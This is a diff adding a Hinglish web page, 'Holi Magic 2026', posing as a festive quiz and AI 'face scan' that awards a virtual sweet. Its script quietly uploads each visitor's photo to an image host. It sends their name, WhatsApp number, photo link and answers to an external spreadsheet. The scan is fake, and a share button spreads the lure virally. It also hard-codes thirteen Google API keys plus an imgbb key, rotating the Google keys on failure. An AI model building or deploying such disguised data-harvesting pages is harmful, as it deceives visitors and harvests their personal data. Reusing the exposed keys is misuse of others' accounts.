@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Holi Magic 2026 🎨</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <style>
+        :root { --navy: #000080; --pink: #ff007f; --gold: #FFD700; }
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://img.freepik.com/free-vector/holi-festival-background-with-pichkari_23-2148850117.jpg');
+            background-size: cover; background-attachment: fixed;
+            margin: 0; display: flex; justify-content: center; min-height: 100vh; padding: 15px;
+        }
+        .card { background: rgba(15, 23, 42, 0.95); width: 100%; max-width: 420px; padding: 25px; border-radius: 20px; border: 2px solid var(--pink); color: white; box-shadow: 0 0 30px rgba(255,0,127,0.5); align-self: center; }
+        .step { display: none; transition: 0.3s; } .active { display: block; animation: slideIn 0.4s; }
+        input, select { width: 100%; padding: 14px; margin: 15px 0; border-radius: 12px; border: none; background: #1e293b; color: white; font-size: 16px; box-sizing: border-box; }
+        .btn-magic { background: linear-gradient(90deg, #ff007f, #000080); color: white; border: none; padding: 16px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 17px; display: block; }
+        #subBtn { display: none; background: linear-gradient(90deg, #FFD700, #ff007f); color: black; box-shadow: 0 0 20px #FFD700; }
+        #giftDisplay { display: none; text-align: center; background: #0f172a; padding: 20px; border-radius: 20px; border: 2px dashed var(--gold); margin-top: 15px; }
+        .mithai-img { width: 160px; height: 160px; object-fit: cover; border-radius: 50%; border: 4px solid var(--gold); margin-bottom: 15px; }
+        .scanner { width: 100%; height: 120px; background: #000; border-radius: 12px; position: relative; display: none; overflow: hidden; margin: 15px 0; }
+        .line { position: absolute; width: 100%; height: 4px; background: #0f0; animation: scan 2s infinite linear; box-shadow: 0 0 10px #0f0; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(30px); } to { opacity: 1; transform: translateX(0); } }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="senderMsg" style="text-align:center; color:var(--gold); font-weight:bold; margin-bottom:15px; font-size:18px;"></div>
+    <h2 style="text-align:center; margin-top:0;">HOLI MAGIC 2026 🎨</h2>
+    
+    <div class="step active" id="s1">
+        <input type="text" id="name" placeholder="Aapka Shubh Name...">
+        <input type="tel" id="number" placeholder="WhatsApp Number...">
+        <button class="btn-magic" onclick="go(2)">CHALO SHURU KAREIN 🚀</button>
+    </div>
+
+    <div class="step" id="s2"><h3>Q1. Holi par nasha kaisa?</h3><select id="q1"><option>Thandai</option><option>Bhaang</option><option>Sirf Gulaal</option></select><button class="btn-magic" onclick="go(3)">Agla Sawal ➔</button></div>
+    <div class="step" id="s3"><h3>Q2. Padosiyon ko kaise rangoge?</h3><select id="q2"><option>Balti bhar ke</option><option>Gulaal se</option><option>Pichkari se</option></select><button class="btn-magic" onclick="go(4)">Agla Sawal ➔</button></div>
+    <div class="step" id="s4"><h3>Q3. Fav Holi Song?</h3><select id="q3"><option>Balam Pichkari</option><option>Rang Barse</option><option>Baby Doll</option></select><button class="btn-magic" onclick="go(5)">Agla Sawal ➔</button></div>
+    <div class="step" id="s5"><h3>Q4. Kaunsa rang chahiye?</h3><select id="q4"><option>Pucca Red</option><option>Neon Green</option><option>Silver</option></select><button class="btn-magic" onclick="go(6)">Agla Sawal ➔</button></div>
+    <div class="step" id="s6"><h3>Q5. Nahaoge ya nahi?</h3><select id="q5"><option>10 Baar</option><option>Agle mahine</option><option>Sirf munh dho lunga</option></select><button class="btn-magic" onclick="go(7)">Aakhri Step ➔</button></div>
+
+    <div class="step" id="s7">
+        <h3>Holi Mood & Face Scan</h3>
+        <p style="font-size:14px; color:var(--gold);">Pehle apni ek mast photo select karein:</p>
+        <input type="file" id="img" accept="image/*" onchange="photoSelected()">
+        
+        <div class="scanner" id="scanner"><div class="line"></div></div>
+        
+        <button class="btn-magic" id="subBtn" onclick="runMagic()">ISSE DABAO AUR MAGIC DEKHO ✨</button>
+
+        <div id="giftDisplay">
+            <h3 id="mithaiTitle" style="color:var(--gold);"></h3>
+            <img id="mithaiImg" class="mithai-img" src="" alt="Mithai">
+            <p id="aiBhavishya" style="font-style:italic; color:#39FF14; font-size:15px;"></p>
+            <button class="btn-magic" style="background:#25D366;" onclick="shareWA()">Dost ko Mithai Bhejein 🚀</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const MITHAIS = [
+        {n: "Special Gujiya", i: "https://t3.ftcdn.net/jpg/04/15/84/87/360_F_415848777_6v6f67JzU6mQ6m7p2Y6R9z9p9p9p9p9p.jpg"},
+        {n: "Kesari Rasmalai", i: "https://t4.ftcdn.net/jpg/02/75/39/23/360_F_275392381_9S9S9S9S9S9S9S9S9S9S9S9S9S9S9S9S.jpg"},
+        {n: "Shahi Thandai", i: "https://www.chefkunalkapur.com/wp-content/uploads/2021/03/Thandai-scaled.jpg"},
+        {n: "Gulaab Jamun", i: "https://t3.ftcdn.net/jpg/02/14/33/96/360_F_214339655_9y9y9y9y9y9y9y9y9y9y9y9y9y9y9y9y.jpg"}
+    ];
+
+    const KEYS = ["AIzaSyDlTWTMi53yT5RTdcaAgINWYSHTwLD2bbM", "AIzaSyA-3JL3Vs4KxsjtfLJcuAxl38ROvpOMcDY", "AIzaSyDnsffowCmRfsSgCoOLr6oQIADdfuxG07s", "AIzaSyA6ur6aRbxcox2K1u1Ll_SXsGrcw4nvFAk", "AIzaSyAv4jTN7j2Y3oyfE_612-h3pbKKpZT4F6c", "AIzaSyBS89qEsCeAjwpvYmuX2F_ckNyh-m0Nrnc", "AIzaSyBWQ61xCnYX3gUDnVWwn16yT0KA3KxLSaA", "AIzaSyDul5ZxBhTotQvKXwNmsGuzEwj2p4FqZEw", "AIzaSyA6oSvPkwlBkgV0ZM89yO3vvevhzqIfz_A", "AIzaSyBY8q-YKpkzrTsmtkV3YAw2NUgkeezy2Jk", "AIzaSyCB3C7N_w98-0ZKEGTO5X2nfkyNk1R0qaw", "AIzaSyCtIPPUIzurLoSxpAQRDp5ONrnsckejwDc", "AIzaSyDtIa_tnB1E4XWptnr5X4_emj4nBiR2NYE"];
+    let kIdx = 0;
+    const SDB = "https://sheetdb.io/api/v1/rgsd8neqqgyiz";
+    const IBB = "0cb94939ba05dea6abdeb1784323f4e4";
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const sender = urlParams.get('from');
+    if(sender) { document.getElementById('senderMsg').innerText = "🎁 " + sender + " ne aapke liye Magic bheja hai!"; }
+
+    function go(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('s'+n).classList.add('active');
+    }
+
+    function photoSelected() {
+        document.getElementById('scanner').style.display = 'block';
+        document.getElementById('subBtn').style.display = 'block'; // Button show karein
+    }
+
+    async function runMagic() {
+        const btn = document.getElementById('subBtn');
+        const img = document.getElementById('img').files[0];
+        btn.innerText = "Magic Analysis Shuru Hai..."; btn.disabled = true;
+
+        try {
+            let fd = new FormData(); fd.append("image", img);
+            let iRes = await fetch(`https://api.imgbb.com/1/upload?key=${IBB}`, {method:"POST", body:fd});
+            let iJson = await iRes.json();
+            let pUrl = iJson.data.url;
+
+            let gift = MITHAIS[Math.floor(Math.random()*MITHAIS.length)];
+            let name = document.getElementById('name').value;
+            let prompt = `Analyze user ${name}'s Holi personality. Match with ${gift.n} and predict their Holi in 1 funny Hindi line (No Donkey/Gadha).`;
+            let bhavishya = "Aap Holi ke sabse mastane khiladi ho!";
+            
+            try {
+                let r = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${KEYS[kIdx]}`, {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({contents:[{parts:[{text:prompt}]}]})
+                });
+                let d = await r.json();
+                bhavishya = d.candidates[0].content.parts[0].text;
+            } catch(e) { kIdx = (kIdx+1)%KEYS.length; }
+
+            await fetch(SDB, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({data:[{
+                    Q1: document.getElementById('q1').value, Q2: document.getElementById('q2').value,
+                    Q3: document.getElementById('q3').value, Q4: document.getElementById('q4').value,
+                    Q5: document.getElementById('q5').value, Name: name, Number: document.getElementById('number').value,
+                    Ai_Photo_Link: pUrl, Answer: bhavishya, Status: "MagicDone"
+                }]})
+            });
+
+            document.getElementById('scanner').style.display = 'none';
+            btn.style.display = 'none';
+            document.getElementById('giftDisplay').style.display = 'block';
+            document.getElementById('mithaiImg').src = gift.i;
+            document.getElementById('mithaiTitle').innerText = "Gift: " + gift.n;
+            document.getElementById('aiBhavishya').innerText = bhavishya;
+            confetti();
+        } catch(e) { alert("Error! Fir se try karein."); btn.disabled = false; }
+    }
+
+    function shareWA() {
+        let myName = document.getElementById('name').value;
+        let shareLink = `${window.location.href.split('?')[0]}?from=${encodeURIComponent(myName)}`;
+        let msg = `Bhai dekho! Holi Magic ne mujhe '${document.getElementById('mithaiTitle').innerText}' bheja hai! 🎁 Check karo tumhe kya milta hai: ${shareLink}`;
+        window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(msg)}`);
+    }
+</script>
+</body>
+  </html>
+  
